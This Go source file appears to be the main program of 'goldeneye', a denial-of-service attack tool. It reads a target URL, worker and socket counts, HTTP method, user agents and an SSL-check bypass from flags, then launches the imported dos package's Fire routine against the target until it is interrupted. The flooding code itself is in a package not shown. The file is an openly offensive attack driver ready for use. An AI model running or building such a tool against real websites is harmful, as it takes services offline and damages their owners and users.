package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/zvdy/goldeneye/pkg/dos"
	"github.com/zvdy/goldeneye/pkg/options"
)

func main() {
	// Parse command-line flags
	opts := options.ParseOptions()

	// Create a context with a timeout or a cancel function
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Handle OS signals to gracefully stop the attack
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		cancel()
	}()

	// Initialize and start the DoS attack
	goldeneye := dos.NewGoldenEye(opts.URL, opts.Workers, opts.Sockets, opts.Method, opts.Debug, opts.NoSSLCheck, opts.UserAgents)
	go goldeneye.Fire(ctx)

	// Wait for the context to be done
	<-ctx.Done()

	fmt.Println("Attack stopped.")
}
